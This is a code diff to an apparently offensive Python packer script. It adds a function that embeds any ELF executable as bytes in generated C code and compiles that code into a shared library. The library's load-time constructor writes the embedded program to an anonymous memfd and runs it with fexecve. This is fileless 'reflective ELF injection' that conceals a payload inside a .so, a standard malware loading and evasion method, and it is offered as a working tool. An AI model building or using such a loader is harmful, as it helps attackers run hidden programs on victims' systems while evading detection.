@@ -7,9 +7,6 @@ import sys
 import os
 import subprocess
 
-def generate_source_exe(exe_path: str, output_path: str) -> None:
-    pass
-
 def generate_source_so(so_path: str, output_path: str) -> None:
     # read the shared object file
     with open(so_path, 'rb') as so_file:
@@ -194,6 +191,65 @@ int main() {{
         output_file.write(c_code)
 
     print(f"Generated source file: {output_path}") # confirm we made the baby
+
+# Fixed your shit builder xxx 
+def generate_source_exe(exe_path: str, output_path: str) -> None:
+    # Read the executable file
+    with open(exe_path, 'rb') as exe_file:
+        exe_data: bytes = exe_file.read()
+    c_code: str = f"""
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+unsigned char exe_data[] = {{
+    {', '.join(f'0x{byte:02x}' for byte in exe_data)}
+}};
+size_t exe_data_size = sizeof(exe_data); 
+
+// Do a reflective ELF injection to load in the executable ELF into memory
+__attribute__((constructor)) void reflective_ELF_injection(void) {{
+
+    int fd  = memfd_create("reflective_inj", 0);
+    if (fd == -1) {{
+        perror("memfd_create");
+        return;
+    }}
+
+    write(fd, exe_data, exe_data_size);
+
+    char *const argv[] = {{NULL}};
+    char *const envp[] = {{NULL}};
+    if (fexecve(fd, argv, envp) == -1) {{
+        perror("fexecve");
+        return;
+    }}
+    close(fd);
+}}
+"""
+    # write the generated C code to a temporary file
+    tmp_file = f'exe_tmp.c'
+    with open(tmp_file, 'w') as output_file:
+        output_file.write(c_code)
+
+    # Generate the temporary .so
+    tmp_so_file = f'exe_tmp.so'
+    compile_cmd: str = f"gcc -shared -fPIC -o {tmp_so_file} {tmp_file}"
+    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
+    if result.returncode != 0:
+        os.unlink(tmp_file)
+        print("Compilation failed:")
+        print(result.stderr) # print error output
+        sys.exit(1)
+
+    # Pack the .so
+    generate_source_so(tmp_so_file, output_path)
+
+    # Delete the temporary files
+    os.unlink(tmp_file)
+    os.unlink(tmp_so_file)
 
 # Executes file -b to determine the filetype information of the file
 def get_ELF_type(filepath: str) -> str:
